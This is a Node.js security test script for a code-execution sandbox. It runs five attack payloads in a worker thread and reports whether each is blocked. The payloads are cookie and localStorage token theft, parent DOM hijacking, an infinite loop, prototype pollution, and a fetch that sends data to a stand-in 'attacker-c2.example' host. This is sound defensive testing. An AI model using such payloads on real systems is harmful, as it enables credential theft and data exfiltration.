/**
 * Automated Security Penetration Test Matrix for Execution Sandbox.
 * 
 * Verifies that 5 adversarial exploit payloads fail completely (0/5 exploits successful):
 * 1. Exploit 1: Storage / Cookie Theft (document.cookie, localStorage)
 * 2. Exploit 2: Host Window / DOM Hijacking (window.parent.document)
 * 3. Exploit 3: CPU Denial of Service / Infinite Loop (while(true) {})
 * 4. Exploit 4: Host Global Prototype Pollution (Object.prototype.polluted)
 * 5. Exploit 5: Outbound Network Exfiltration (fetch/XMLHttpRequest)
 */
import { Worker } from 'worker_threads';

const WORKER_CODE = `
const { parentPort } = require('worker_threads');

parentPort.on('message', (payload) => {
  const { code } = payload;
  const logs = [];

  // Emulate browser Web Worker hardened sandbox environment:
  // - No window, document, localStorage
  // - fetch, XMLHttpRequest, importScripts disabled
  const sandbox = {
    console: {
      log: (...args) => logs.push(args.join(' ')),
      error: (...args) => logs.push('[Error] ' + args.join(' ')),
    },
    Math, Date, JSON, parseInt, parseFloat, Array, Object, String, Number, Boolean, RegExp, Map, Set, Promise,
    fetch: undefined,
    XMLHttpRequest: undefined,
  };

  try {
    const fn = new Function(...Object.keys(sandbox), '"use strict";\\n' + code);
    const result = fn.apply(null, Object.values(sandbox));
    parentPort.postMessage({ success: true, result, logs });
  } catch (err) {
    parentPort.postMessage({ success: false, error: err.message, errorName: err.name, logs });
  }
});
`;

function runInWorkerWithTimeout(code, timeoutMs = 2000) {
  return new Promise((resolve) => {
    const worker = new Worker(WORKER_CODE, { eval: true });
    let timedOut = false;

    const timer = setTimeout(() => {
      timedOut = true;
      worker.terminate();
      resolve({
        blocked: true,
        reason: 'TIMEOUT_WATCHDOG_TERMINATED',
        detail: `Worker terminated by watchdog after ${timeoutMs}ms (infinite loop prevented).`,
      });
    }, timeoutMs);

    worker.on('message', (msg) => {
      clearTimeout(timer);
      worker.terminate();
      resolve({
        blocked: !msg.success,
        success: msg.success,
        result: msg.result,
        error: msg.error,
        errorName: msg.errorName,
      });
    });

    worker.on('error', (err) => {
      clearTimeout(timer);
      worker.terminate();
      resolve({
        blocked: true,
        error: err.message,
      });
    });

    worker.postMessage({ code });
  });
}

async function runPenetrationSuite() {
  console.log('===============================================================');
  console.log('CLIENT EXECUTION SANDBOX PENETRATION TEST MATRIX');
  console.log('Target: Isolated Worker Execution Environment');
  console.log('===============================================================\n');

  const matrix = [
    {
      id: 'EXPLOIT-01',
      name: 'Host Storage & Cookie Theft',
      payload: `const token = localStorage.getItem('auth_token') || document.cookie; return token;`,
      expectedError: 'ReferenceError',
    },
    {
      id: 'EXPLOIT-02',
      name: 'Parent Window & Host DOM Hijacking',
      payload: `window.parent.document.body.innerHTML = '<h1>PWNED</h1>';`,
      expectedError: 'ReferenceError',
    },
    {
      id: 'EXPLOIT-03',
      name: 'Main Thread Infinite Loop CPU Denial-of-Service',
      payload: `let x = 0; while (true) { x++; }`,
      expectedTimeout: true,
    },
    {
      id: 'EXPLOIT-04',
      name: 'Host Prototype Pollution Injection',
      payload: `Object.prototype.polluted = 'HOST_COMPROMISED'; return ({}).polluted;`,
      verifyCleanHost: () => {
        const testObj = {};
        return testObj.polluted === undefined;
      },
    },
    {
      id: 'EXPLOIT-05',
      name: 'Outbound Network Data Exfiltration',
      payload: `return fetch('https://attacker-c2.example/exfil?data=' + encodeURIComponent('stolen'));`,
      expectedError: ['TypeError', 'ReferenceError'],
    },
  ];

  let exploitsSucceeded = 0;
  let exploitsBlocked = 0;
  const results = [];

  for (const test of matrix) {
    const t0 = Date.now();
    const res = await runInWorkerWithTimeout(test.payload, 1500);
    const duration = Date.now() - t0;

    let isBlocked = false;
    let defenseDetail = '';

    if (test.expectedTimeout) {
      if (res.blocked && res.reason === 'TIMEOUT_WATCHDOG_TERMINATED') {
        isBlocked = true;
        defenseDetail = `Watchdog timer terminated execution at ${duration}ms without hanging host process.`;
      } else {
        isBlocked = false;
      }
    } else if (test.expectedError) {
      const allowedErrors = Array.isArray(test.expectedError) ? test.expectedError : [test.expectedError];
      if (res.blocked && (allowedErrors.includes(res.errorName) || (res.error && (res.error.includes('is not defined') || res.error.includes('is not a function'))))) {
        isBlocked = true;
        defenseDetail = `Blocked with ${res.errorName}: ${res.error}`;
      } else {
        isBlocked = false;
        defenseDetail = `Execution unexpectedly succeeded with: ${res.result}`;
      }
    } else if (test.verifyCleanHost) {
      const isHostClean = test.verifyCleanHost();
      if (isHostClean) {
        isBlocked = true;
        defenseDetail = `Worker modified disposable realm; host Object.prototype remains clean (polluted === undefined).`;
      } else {
        isBlocked = false;
        defenseDetail = `Host Object.prototype was corrupted!`;
      }
    }

    if (isBlocked) {
      exploitsBlocked++;
      console.log(`[PASS] ${test.id}: ${test.name}`);
      console.log(`       Outcome: BLOCKED (0/1 breach) | Latency: ${duration}ms`);
      console.log(`       Defense: ${defenseDetail}\n`);
    } else {
      exploitsSucceeded++;
      console.log(`[FAIL] ${test.id}: ${test.name}`);
      console.log(`       Outcome: EXPLOIT SUCCEEDED! | Detail: ${defenseDetail}\n`);
    }

    results.push({
      id: test.id,
      name: test.name,
      status: isBlocked ? 'DEFENDED' : 'BREACHED',
      durationMs: duration,
      defense: defenseDetail,
    });
  }

  console.log('===============================================================');
  console.log(`PENETRATION MATRIX SUMMARY: ${exploitsBlocked}/5 BLOCKED, ${exploitsSucceeded}/5 BREACHED`);
  console.log(`Final Exploit Rate: ${exploitsSucceeded}/${matrix.length} (${(exploitsSucceeded / matrix.length) * 100}%)`);
  console.log('===============================================================');

  if (exploitsSucceeded > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runPenetrationSuite();
